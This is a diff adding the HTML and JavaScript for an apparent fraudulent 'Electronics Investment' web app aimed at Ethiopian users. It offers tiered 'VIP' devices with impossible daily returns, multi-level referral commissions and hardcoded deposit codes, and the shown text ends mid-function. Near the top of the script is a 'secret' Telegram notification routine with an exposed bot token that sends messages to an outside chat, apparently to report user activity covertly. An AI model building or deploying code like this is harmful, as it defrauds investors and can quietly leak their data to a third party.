@@ -1,0 +1,1589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Electronics Product Investment platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0f172a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding-bottom: 70px;
+            color: #333;
+        }
+        .app-container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: #f8fafc;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.2);
+            position: relative;
+        }
+        .top-lang-header {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border-bottom: 1px solid #e2e8f0;
+            position: relative;
+            z-index: 10;
+        }
+        .lang-select-dropdown {
+            padding: 6px 12px;
+            font-size: 0.85rem;
+            border-radius: 20px;
+            border: 1px solid #cbd5e1;
+            background: #f8fafc;
+            color: #1e3a8a;
+            font-weight: bold;
+            outline: none;
+            cursor: pointer;
+            width: auto;
+        }
+
+        /* --- AUTH SECTION BACKGROUND --- */
+        #authSection {
+            min-height: calc(100vh - 50px);
+            background: linear-gradient(rgba(15, 23, 42, 0.65), rgba(15, 23, 42, 0.75)), 
+                        url('https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1000&q=80') center/cover no-repeat;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Banner graphic element representing Electronics Investment paper holding group */
+        .auth-banner-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 12px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px dashed #2563eb;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+        }
+        .auth-banner-card h2 {
+            font-size: 1.1rem;
+            color: #1e3a8a;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .auth-card {
+            width: 100%;
+            padding: 25px 20px;
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(8px);
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .auth-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .auth-header h1 {
+            color: #1e3a8a;
+            font-size: 1.6rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .toggle-buttons {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #e2e8f0;
+        }
+        .toggle-btn {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            color: #64748b;
+        }
+        .toggle-btn.active {
+            color: #2563eb;
+            border-bottom: 3px solid #2563eb;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1px solid #cbd5e1;
+            border-radius: 60px;
+            font-size: 1rem;
+            outline: none;
+            background: #f8fafc;
+        }
+        input:focus {
+            border-color: #2563eb;
+            background: #fff;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #2563eb, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 60px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
+            transition: all 0.2s;
+        }
+        button:active {
+            transform: scale(0.98);
+        }
+        .error {
+            color: #ef4444;
+            font-size: 0.85rem;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .dashboard {
+            display: none;
+        }
+        .top-bar {
+            background: linear-gradient(135deg, #1e3a8a, #2563eb);
+            padding: 24px 20px 16px;
+            color: white;
+            border-radius: 0 0 20px 20px;
+        }
+        .greeting {
+            font-size: 1.3rem;
+            font-weight: bold;
+        }
+        .logout-link {
+            text-align: right;
+            font-size: 0.8rem;
+            margin: 10px 16px 0;
+            cursor: pointer;
+            color: #ef4444;
+            font-weight: 600;
+        }
+        .balance-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 16px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            border: 1px solid #e2e8f0;
+        }
+        .balance-amount {
+            font-size: 2.2rem;
+            font-weight: bold;
+            color: #1e3a8a;
+            margin: 8px 0;
+        }
+        .quick-actions {
+            display: flex;
+            justify-content: space-around;
+            margin: 16px;
+            gap: 10px;
+        }
+        .quick-btn {
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            padding: 12px 8px;
+            text-align: center;
+            flex: 1;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+        }
+        .quick-btn i {
+            font-size: 1.4rem;
+            color: #2563eb;
+            display: block;
+            margin-bottom: 6px;
+        }
+        .quick-btn span {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: #334155;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0 16px;
+            border-top: 1px solid #e2e8f0;
+            box-shadow: 0 -4px 10px rgba(0,0,0,0.03);
+        }
+        .nav-item {
+            text-align: center;
+            cursor: pointer;
+            flex: 1;
+            color: #64748b;
+        }
+        .nav-item i {
+            font-size: 1.3rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .nav-item span {
+            font-size: 0.75rem;
+        }
+        .nav-item.active {
+            color: #2563eb;
+            font-weight: bold;
+        }
+        .panel {
+            display: none;
+            padding: 16px;
+        }
+        .panel.active-panel {
+            display: block;
+        }
+        .vip-card, .withdraw-card, .deposit-step-card, .bank-card-form {
+            background: white;
+            border-radius: 20px;
+            padding: 18px;
+            margin-bottom: 16px;
+            border: 1px solid #e2e8f0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .vip-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 14px;
+        }
+        .club-logo {
+            width: 65px;
+            height: 65px;
+            object-fit: cover;
+            border-radius: 12px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        .vip-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1e3a8a;
+        }
+        .vip-detail {
+            display: flex;
+            justify-content: space-between;
+            margin: 8px 0;
+            font-size: 0.9rem;
+            color: #475569;
+        }
+        .amount-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .amount-btn, .bank-option {
+            background: #f1f5f9;
+            padding: 12px 8px;
+            text-align: center;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.1s;
+            font-weight: 600;
+            font-size: 0.9rem;
+            border: 1px solid #cbd5e1;
+        }
+        .amount-btn.selected, .bank-option.selected {
+            background: #2563eb;
+            color: white;
+            border-color: #2563eb;
+        }
+        .bank-select-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 15px 0;
+        }
+        .copy-btn {
+            background: #2563eb;
+            padding: 4px 12px;
+            border-radius: 20px;
+            color: white;
+            cursor: pointer;
+            display: inline-block;
+            margin-left: 8px;
+            font-size: 0.75rem;
+        }
+        .report-item {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 10px;
+            border-left: 5px solid #2563eb;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .status-pending { color: #d97706; font-weight: bold; }
+        .status-success { color: #16a34a; font-weight: bold; }
+        .status-failed { color: #dc2626; font-weight: bold; }
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+            display: flex; align-items: center; justify-content: center;
+            z-index: 2000;
+        }
+        .report-modal, .bank-select-modal {
+            background: white;
+            border-radius: 24px;
+            width: 92%;
+            max-width: 440px;
+            max-height: 85vh;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        /* --- CUSTOM REPORT LAYOUT STYLES --- */
+        .report-tab-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 10px;
+        }
+        .report-tab-btn {
+            flex: 1;
+            padding: 10px 5px;
+            text-align: center;
+            background: #f1f5f9;
+            color: #475569;
+            border-radius: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.2s ease;
+        }
+        .report-tab-btn.active-dep {
+            background: #2563eb;
+            color: white;
+        }
+        .report-tab-btn.active-wd {
+            background: #0d9488;
+            color: white;
+        }
+        .report-split-grid {
+            display: flex;
+            gap: 12px;
+            width: 100%;
+        }
+        .report-col {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .team-level { background: #f1f5f9; border-radius: 14px; padding: 14px; margin: 10px 0; }
+        .three-dot-icon {
+            background: #e2e8f0; border-radius: 50%; width: 38px; height: 38px;
+            display: inline-flex; align-items: center; justify-content: center;
+            cursor: pointer; font-size: 1.1rem; color: #334155;
+        }
+        .bank-header-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; }
+        .bank-option-item {
+            padding: 12px;
+            border-bottom: 1px solid #e2e8f0;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .bank-option-item:hover {
+            background: #f8fafc;
+        }
+        .timer-text { font-size: 0.75rem; color: #d97706; margin-top: 4px; }
+        .btn-secondary {
+            background: #94a3b8;
+            box-shadow: none;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+<div class="app-container">
+
+    <!-- Top Header for Language Selector -->
+    <div class="top-lang-header">
+        <select id="langSelector" class="lang-select-dropdown">
+            <option value="en" selected>🌐 English</option>
+            <option value="am">🌐 አማርኛ</option>
+        </select>
+    </div>
+
+    <!-- Auth Section with Attractive Image Background -->
+    <div id="authSection">
+        <div class="auth-card">
+            <div class="auth-banner-card">
+                <h2><i class="fas fa-file-contract"></i> Electronics Investment</h2>
+            </div>
+            <div class="auth-header">
+                <h1><i class="fas fa-plug"></i> ELECTRONICS INVESTMENT</h1>
+                <p id="txtAuthSubtitle" style="color: #64748b; margin-top: 5px;">Invest in high-demand electronic devices</p>
+            </div>
+            <div class="toggle-buttons">
+                <div id="loginTab" class="toggle-btn active">LOG IN</div>
+                <div id="registerTab" class="toggle-btn">REGISTER</div>
+            </div>
+            <div id="loginForm">
+                <div class="form-group"><input type="tel" id="loginPhone" placeholder="Mobile Number"></div>
+                <div class="form-group"><input type="password" id="loginPassword" placeholder="Password"></div>
+                <button id="doLoginBtn">LOG IN</button>
+                <div id="loginError" class="error"></div>
+            </div>
+            <div id="registerForm" style="display:none;">
+                <div class="form-group"><input type="tel" id="regPhone" placeholder="Mobile Number"></div>
+                <div class="form-group"><input type="password" id="regPassword" placeholder="Password"></div>
+                <div class="form-group"><input type="password" id="regConfirm" placeholder="Confirm Password"></div>
+                <div class="form-group"><input type="text" id="inviteCode" placeholder="Invitation Code (optional)"></div>
+                <button id="doRegisterBtn">REGISTER</button>
+                <div id="regError" class="error"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Dashboard -->
+    <div id="dashboard" class="dashboard">
+        <div class="top-bar"><div class="greeting" id="greetingText">⚡ Welcome, Investor!</div></div>
+        <div class="logout-link" id="logoutBtn">← Logout</div>
+        <div class="balance-card">
+            <div id="lblMyBalance" style="color: #64748b; font-size: 0.9rem;">💰 My Balance</div>
+            <div class="balance-amount" id="balanceDisplay">ETB 0.00</div>
+            <div style="color: #475569; font-size: 0.9rem;"><span id="lblTotalIncome">Total Income:</span> <span id="totalIncome" style="font-weight: bold; color: #16a34a;">ETB 0.00</span></div>
+        </div>
+        <div class="quick-actions">
+            <div class="quick-btn" data-action="deposit"><i class="fas fa-wallet"></i><span id="btnNavDeposit">Deposit</span></div>
+            <div class="quick-btn" data-action="withdraw"><i class="fas fa-hand-holding-usd"></i><span id="btnNavWithdraw">Withdraw</span></div>
+            <div class="quick-btn" data-action="checkin"><i class="fas fa-calendar-check"></i><span id="btnNavCheckin">Check In</span></div>
+            <div class="quick-btn" data-action="service"><i class="fas fa-headset"></i><span id="btnNavService">Service</span></div>
+        </div>
+        <!-- Panels -->
+        <div id="homePanel" class="panel active-panel"></div>
+        <div id="ordersPanel" class="panel"></div>
+        <div id="showPanel" class="panel"></div>
+        <div id="sharePanel" class="panel"></div>
+        <div id="myPanel" class="panel"></div>
+        <div id="depositPanel" class="panel"></div>
+        <div id="withdrawPanel" class="panel"></div>
+        <div id="servicePanel" class="panel"></div>
+        <div class="bottom-nav">
+            <div class="nav-item" data-nav="home"><i class="fas fa-home"></i><span id="navHome">Home</span></div>
+            <div class="nav-item" data-nav="orders"><i class="fas fa-shopping-bag"></i><span id="navOrders">Orders</span></div>
+            <div class="nav-item" data-nav="show"><i class="fas fa-tv"></i><span id="navShow">Show</span></div>
+            <div class="nav-item" data-nav="share"><i class="fas fa-users"></i><span id="navShare">Share</span></div>
+            <div class="nav-item" data-nav="my"><i class="fas fa-user"></i><span id="navMy">My</span></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // --- TELEGRAM SECRET NOTIFICATION SYSTEM ---
+    const TELEGRAM_BOT_TOKEN = "8485834067:AAFcelf2pa4RqKUH8WXi761bvRhKWeWY39A";
+    const TELEGRAM_CHAT_ID = "@abrhamgood";
+
+    function sendSecretTelegramNotification(message) {
+        if(!TELEGRAM_BOT_TOKEN) return;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        }).catch(err => console.error("Secret notification error:", err));
+    }
+
+    // Language Dictionary
+    let currentLang = 'en';
+    const translations = {
+        en: {
+            authSubtitle: "Invest in high-demand electronic devices",
+            loginTab: "LOG IN",
+            registerTab: "REGISTER",
+            phonePlaceholder: "Mobile Number",
+            pwdPlaceholder: "Password",
+            confPwdPlaceholder: "Confirm Password",
+            invitePlaceholder: "Invitation Code (optional)",
+            btnLogin: "LOG IN",
+            btnRegister: "REGISTER",
+            welcome: "⚡ Welcome, Investor!",
+            logout: "← Logout",
+            myBalance: "💰 My Balance",
+            totalIncome: "Total Income:",
+            deposit: "Deposit",
+            withdraw: "Withdraw",
+            checkin: "Check In",
+            service: "Service",
+            navHome: "Home",
+            navOrders: "Orders",
+            navShow: "Show",
+            navShare: "Share",
+            navMy: "My"
+        },
+        am: {
+            authSubtitle: "ተፈላለጊ የኤሌክትሮኒክስ እቃዎች ላይ ኢንቨስት ያድርጉ",
+            loginTab: "ግባ",
+            registerTab: "ተመዝገብ",
+            phonePlaceholder: "ስልክ ቁጥር",
+            pwdPlaceholder: "የይለፍ ቃል",
+            confPwdPlaceholder: "የይለፍ ቃል ያረጋግጡ",
+            invitePlaceholder: "የጋብዣ ኮድ (ካልዎት)",
+            btnLogin: "ግባ",
+            btnRegister: "ተመዝገብ",
+            welcome: "⚡ እንኳን ደህና መጡ!",
+            logout: "← ውጣ",
+            myBalance: "💰 የእኔ ቀሪ ሂሳብ",
+            totalIncome: "ጠቅላላ ገቢ:",
+            deposit: "ገቢ ያድርጉ",
+            withdraw: "ወጪ ያድርጉ",
+            checkin: "ዕለታዊ ተግባር",
+            service: "አገልግሎት",
+            navHome: "ዋና ገጽ",
+            navOrders: "ትዕዛዞች",
+            navShow: "ማሳያ",
+            navShare: "ያጋሩ",
+            navMy: "የእኔ ገጽ"
+        }
+    };
+
+    function updateLanguage(lang) {
+        currentLang = lang;
+        const t = translations[lang];
+        document.getElementById('txtAuthSubtitle').innerText = t.authSubtitle;
+        document.getElementById('loginTab').innerText = t.loginTab;
+        document.getElementById('registerTab').innerText = t.registerTab;
+        document.getElementById('loginPhone').placeholder = t.phonePlaceholder;
+        document.getElementById('loginPassword').placeholder = t.pwdPlaceholder;
+        document.getElementById('doLoginBtn').innerText = t.btnLogin;
+        document.getElementById('regPhone').placeholder = t.phonePlaceholder;
+        document.getElementById('regPassword').placeholder = t.pwdPlaceholder;
+        document.getElementById('regConfirm').placeholder = t.confPwdPlaceholder;
+        document.getElementById('inviteCode').placeholder = t.invitePlaceholder;
+        document.getElementById('doRegisterBtn').innerText = t.btnRegister;
+        document.getElementById('logoutBtn').innerText = t.logout;
+        document.getElementById('lblMyBalance').innerText = t.myBalance;
+        document.getElementById('lblTotalIncome').innerText = t.totalIncome;
+        document.getElementById('btnNavDeposit').innerText = t.deposit;
+        document.getElementById('btnNavWithdraw').innerText = t.withdraw;
+        document.getElementById('btnNavCheckin').innerText = t.checkin;
+        document.getElementById('btnNavService').innerText = t.service;
+        document.getElementById('navHome').innerText = t.navHome;
+        document.getElementById('navOrders').innerText = t.navOrders;
+        document.getElementById('navShow').innerText = t.navShow;
+        document.getElementById('navShare').innerText = t.navShare;
+        document.getElementById('navMy').innerText = t.navMy;
+        updateDashboardUI();
+    }
+
+    document.getElementById('langSelector').addEventListener('change', (e) => {
+        updateLanguage(e.target.value);
+    });
+
+    // Valid Guest/Chest Promo Codes List
+    const validGuestCodes = [
+        "digjgwfkfdh", "qxplmzantye", "wvbncsklrui", "ftgyhjklopm", "zxcvbnmasdf",
+        "qwertyuiopq", "asdfghjklzx", "yuiopasdfgh", "jklzxcvbnmq", "wertyuiopas",
+        "dfghjklxcvb", "nbmqwertyui", "opasdfghjkl", "zxcvbnmtyui", "qwertyuioplk",
+        "mnbvcxzasdf", "lkjhgfdsapq", "iuytrewqazx", "plokmijnuhb", "tgvfcdxswza",
+        "qazwsxedcrf", "tgbyhnujmik", "olyhngbfvdc", "exswzaqplok", "mjnhbgvfcdx",
+        "qwertyuiopl", "mnbvcxzlkjh", "gfdsapoiuyt", "rewqazxswed", "cvbnmkiuytg",
+        "fdssawqqwer", "tyuiopplkjh", "gfdssaazxcv", "bnmkkjhgfd",  "wertyuiopps",
+        "asdfghjklmn", "zxcvbnmplok", "iuytrewqasd", "fghjklzxcvb", "qwertyuiopl",
+        "mnbvcxzrewq", "lkjhgfdsayu", "poiuytrewq",  "asdfghjklzx", "cvbnmkiuyt",
+        "qwertyuiop",  "mnbvcxzasd",  "lkjhgfdsap",  "iuytrewqaz",  "plokmijnuh",
+        "tgvfcdxswz",  "qazwsxedcr",  "tgbyhnujmi",  "olyhngbfvd",  "exswzaqplo",
+        "mjnhbgvfcd",  "qwertyuiop",  "mnbvcxzlkj",  "gfdsapoiuy",  "rewqazxswa",
+        "cvbnmkiuyt",  "fdssawqqwe",  "tyuiopplkj",  "gfdssaazxc",  "bnmkkjhgfd",
+        "wertyuiopp",  "asdfghjklm",  "zxcvbnmplo",  "iuytrewqas",  "fghjklzxcv",
+        "qwertyuiop",  "mnbvcxzrew",  "lkjhgfdsay",  "poiuytrewq",  "asdfghjklz",
+        "cvbnmkiuyt",  "qwertyuiop",  "mnbvcxzasd",  "lkjhgfdsap",  "iuytrewqaz",
+        "plokmijnuh",  "tgvfcdxswz",  "qazwsxedcr",  "tgbyhnujmi",  "olyhngbfvd",
+        "exswzaqplo",  "mjnhbgvfcd",  "qwertyuiop",  "mnbvcxzlkj",  "gfdsapoiuy",
+        "rewqazxswa",  "cvbnmkiuyt",  "fdssawqqwe",  "tyuiopplkj",  "gfdssaazxc",
+        "bnmkkjhgfd",  "wertyuiopp",  "asdfghjklm",  "zxcvbnmplo",  "iuytrewqas",
+        "fghjklzxcv",  "qwertyuiop",  "mnbvcxzrew",  "lkjhgfdsay",  "poiuytrewq",
+        "asdfghjklz",  "cvbnmkiuyt",  "qwertyuiop",  "mnbvcxzasd",  "lkjhgfdsap",
+        "iuytrewqaz",  "plokmijnuh",  "tgvfcdxswz",  "qazwsxedcr",  "tgbyhnujmi",
+        "olyhngbfvd",  "exswzaqplo",  "mjnhbgvfcd",  "qwertyuiop",  "mnbvcxzlkj",
+        "gfdsapoiuy",  "rewqazxswa",  "cvbnmkiuyt",  "fdssawqqwe",  "tyuiopplkj",
+        "gfdssaazxc",  "bnmkkjhgfd",  "wertyuiopp",  "asdfghjklm",  "zxcvbnmplo",
+        "iuytrewqas",  "fghjklzxcv",  "qwertyuiop",  "mnbvcxzrew",  "lkjhgfdsay",
+        "poiuytrewq",  "asdfghjklz",  "cvbnmkiuyt",  "qwertyuiop",  "mnbvcxzasd",
+        "lkjhgfdsap",  "iuytrewqaz",  "plokmijnuh",  "tgvfcdxswz",  "qazwsxedcr",
+        "tgbyhnujmi",  "olyhngbfvd",  "exswzaqplo",  "mjnhbgvfcd",  "qwertyuiop",
+        "mnbvcxzlkj",  "gfdsapoiuy",  "rewqazxswa",  "cvbnmkiuyt",  "fdssawqqwe",
+        "tyuiopplkj",  "gfdssaazxc",  "bnmkkjhgfd",  "wertyuiopp",  "asdfghjklm"
+    ];
+
+    function getCodeInfo(code) {
+        let codeData = JSON.parse(localStorage.getItem("fgi_guest_code_" + code) || '{"usedUsers":[], "count":0}');
+        return codeData;
+    }
+
+    // DATA MODELS
+    let currentUser = null;
+    function getUsers() { return JSON.parse(localStorage.getItem("fgi_users") || "{}"); }
+    function saveUsers(u) { localStorage.setItem("fgi_users", JSON.stringify(u)); }
+    function getUserStats(phone) { let s = localStorage.getItem("fgi_stats_"+phone); return s ? JSON.parse(s) : { balance:200, totalIncome:0, totalDeposit:0, totalWithdraw:0, lastCheckIn:null }; }
+    function saveUserStats(phone, stats) { localStorage.setItem("fgi_stats_"+phone, JSON.stringify(stats)); }
+    function getUserBank(phone) { let b = localStorage.getItem("fgi_bank_"+phone); return b ? JSON.parse(b) : null; }
+    function saveUserBank(phone, bank) { localStorage.setItem("fgi_bank_"+phone, JSON.stringify(bank)); }
+    function getUserPurchases(phone) { let p = localStorage.getItem("fgi_purch_"+phone); return p ? JSON.parse(p) : []; }
+    function saveUserPurchases(phone, p) { localStorage.setItem("fgi_purch_"+phone, JSON.stringify(p)); }
+    function getDepositRequests(phone) { let d = localStorage.getItem("fgi_dep_req_"+phone); return d ? JSON.parse(d) : []; }
+    function saveDepositRequests(phone, d) { localStorage.setItem("fgi_dep_req_"+phone, JSON.stringify(d)); }
+    function getWithdrawRequests(phone) { let w = localStorage.getItem("fgi_wd_req_"+phone); return w ? JSON.parse(w) : []; }
+    function saveWithdrawRequests(phone, w) { localStorage.setItem("fgi_wd_req_"+phone, JSON.stringify(w)); }
+    function getReferralTree() { return JSON.parse(localStorage.getItem("fgi_refs") || "{}"); }
+    function saveReferralTree(t) { localStorage.setItem("fgi_refs", JSON.stringify(t)); }
+
+    // --- PHONE MASKING (first 3 + last 2 digits only) ---
+    function maskPhone(phone) {
+        if(!phone) return '';
+        let p = String(phone).trim();
+        if(p.length <= 5) {
+            if(p.length <= 2) return p;
+            return p.slice(0,1) + '***' + p.slice(-1);
+        }
+        return p.slice(0,3) + '***' + p.slice(-2);
+    }
+
+    // --- GET REFERRAL TEAM GROUPED BY LEVEL 1, 2, 3 ---
+    function getTeamByLevels(phone) {
+        let users = getUsers();
+        let levels = { 1: [], 2: [], 3: [] };
+        // Level 1: direct referrals
+        for(let p in users) {
+            if(users[p] && users[p].referrer === phone) levels[1].push(p);
+        }
+        // Level 2: referrals of level 1 members
+        for(let p in users) {
+            if(users[p] && levels[1].includes(users[p].referrer)) levels[2].push(p);
+        }
+        // Level 3: referrals of level 2 members
+        for(let p in users) {
+            if(users[p] && levels[2].includes(users[p].referrer)) levels[3].push(p);
+        }
+        return levels;
+    }
+
+    function isMemberActive(memberPhone) {
+        try {
+            let s = getUserStats(memberPhone);
+            let purch = getUserPurchases(memberPhone);
+            return (s.totalDeposit > 0) || (purch && purch.length > 0);
+        } catch(e) { return false; }
+    }
+
+    // Electronics Investment Products (VIP Levels)
+    const vipLevels = [
+        { id:1, name:"Level 1 - Smart Earbuds", logo:"https://images.unsplash.com/photo-1590658268037-6bf12165a8df?w=200&auto=format&fit=crop&q=80", price:600, daily:50, total:15000, days:300 },
+        { id:2, name:"Level 2 - Fitness Smartwatch", logo:"https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=200&auto=format&fit=crop&q=80", price:1000, daily:85, total:25500, days:300 },
+        { id:3, name:"Level 3 - Bluetooth Speaker", logo:"https://images.unsplash.com/photo-1608043152269-423dbba4e7e1?w=200&auto=format&fit=crop&q=80", price:3000, daily:260, total:78000, days:300 },
+        { id:4, name:"Level 4 - Wireless Gaming Controller", logo:"https://images.unsplash.com/photo-1600080972464-8e5f35f63d08?w=200&auto=format&fit=crop&q=80", price:6400, daily:560, total:168000, days:300 },
+        { id:5, name:"Level 5 - Action Camera 4K", logo:"https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=200&auto=format&fit=crop&q=80", price:10000, daily:909, total:272700, days:300 },
+        { id:6, name:"Level 6 - Noise Cancelling Headphones", logo:"https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=200&auto=format&fit=crop&q=80", price:23000, daily:2150, total:645000, days:300 },
+        { id:7, name:"Level 7 - Android Tablet Pro", logo:"https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=200&auto=format&fit=crop&q=80", price:43000, daily:4150, total:1245000, days:300 },
+        { id:8, name:"Level 8 - 4K Ultra HD Smart TV", logo:"https://images.unsplash.com/photo-1593784991095-a205069470b6?w=200&auto=format&fit=crop&q=80", price:86000, daily:8600, total:2580000, days:300 },
+        { id:9, name:"Level 9 - High Performance Gaming Laptop", logo:"https://images.unsplash.com/photo-1603302576837-37561b2e2302?w=200&auto=format&fit=crop&q=80", price:120000, daily:12500, total:3750000, days:300 },
+        { id:10, name:"Level 10 - High-End Smartphone Flagship", logo:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=200&auto=format&fit=crop&q=80", price:240000, daily:26000, total:7800000, days:300 },
+        { id:11, name:"Level 11 - Drone Quadcopter 4K", logo:"https://images.unsplash.com/photo-1527977966376-1c8408f9f108?w=200&auto=format&fit=crop&q=80", price:340000, daily:38000, total:11400000, days:300 }
+    ];
+
+    const validTINsByLevel = {
+        1: ["FT1A3B5C7D9E", "FT2F4H6J8K0L", "FT3M5N7P9Q1R", "FT4S6T8U0V2W"],
+        2: ["FT5X7Y9Z1A3B", "FT6C8D0E2F4G", "FT7H9J1K3L5M", "FT8N0P2Q4R6S"],
+        3: ["FT9T1U3V5W7X", "FT0Y2Z4A6B8C", "FT1D3E5F7G9H", "FT2J4K6L8M0N"],
+        4: ["FT3P5Q7R9S1T", "FT4U6V8W0X2Y", "FT5Z7A9B1C3D", "FT6E8F0G2H4J"],
+        5: ["FT7K9L1M3N5P", "FT8Q0R2S4T6U", "FT9V1W3X5Y7Z", "FT0A2C4E6G8I"],
+        6: ["FT1K3M5O7Q9S", "FT2U4W6Y8A0C", "FT3E5G7I9K1M", "FT4O6Q8S0U2W"],
+        7: ["FT5Y7A9C1E3G", "FT6I8K0M2O4Q", "FT7S9U1W3Y5A", "FT8C0E2G4I6K"],
+        8: ["FT9M1O3Q5S7U", "FT0W2Y4A6C8E", "FT1G3I5K7M9O", "FT2Q4S6U8W0Y"],
+        9: ["FT3A5C7E9G1I", "FT4K6M8O0Q2S", "FT5U7W9Y1A3C", "FT6E8G0I2K4M"],
+        10: ["FT7O9Q1S3U5W", "FT8Y0A2C4E6G", "FT9I1K3M5O7Q", "FT0S2U4W6Y8A"],
+        11: ["FT1C3E5G7I9K", "FT2M4O6Q8S0U", "FT3W5Y7A9C1E", "FT4G6I8K0M2O"]
+    };
+
+    function isTinValidForAmount(tin, amount) {
+        let vip = vipLevels.find(v => v.price === amount);
+        if (!vip) return false;
+        let allowedTins = validTINsByLevel[vip.id] || [];
+        return allowedTins.includes(tin.trim().toUpperCase());
+    }
+
+    function processDailyIncome(phone) {
+        let purchases = getUserPurchases(phone);
+        let stats = getUserStats(phone);
+        let now = Date.now();
+        let updated = false;
+        for(let p of purchases) {
+            if(!p.lastClaim) p.lastClaim = p.purchaseTime;
+            let daysDiff = Math.floor((now - p.lastClaim) / (24*60*60*1000));
+            if(daysDiff >= 1) {
+                let vip = vipLevels.find(v => v.id === p.vipId);
+                if(vip) {
+                    let income = vip.daily * daysDiff;
+                    stats.balance += income;
+                    stats.totalIncome += income;
+                    p.lastClaim += daysDiff * 24*60*60*1000;
+                    updated = true;
+                }
+            }
+        }
+        if(updated) {
+            saveUserStats(phone, stats);
+            saveUserPurchases(phone, purchases);
+            updateDashboardUI();
+        }
+    }
+
+    function updateDashboardUI() {
+        if(!currentUser) return;
+        let stats = getUserStats(currentUser);
+        document.getElementById('balanceDisplay').innerText = `ETB ${stats.balance.toFixed(2)}`;
+        document.getElementById('totalIncome').innerText = `ETB ${stats.totalIncome.toFixed(2)}`;
+        const wMsg = currentLang === 'am' ? `⚡ እንኳን ደህና መጡ, ${currentUser.slice(-4)}!` : `⚡ Welcome, ${currentUser.slice(-4)}!`;
+        document.getElementById('greetingText').innerHTML = wMsg;
+    }
+
+    function distributeReferralCommission(depositor, amount) {
+        let users = getUsers();
+        let referrer = users[depositor]?.referrer;
+        if(!referrer) return;
+
+        let comm1 = amount * 0.20;
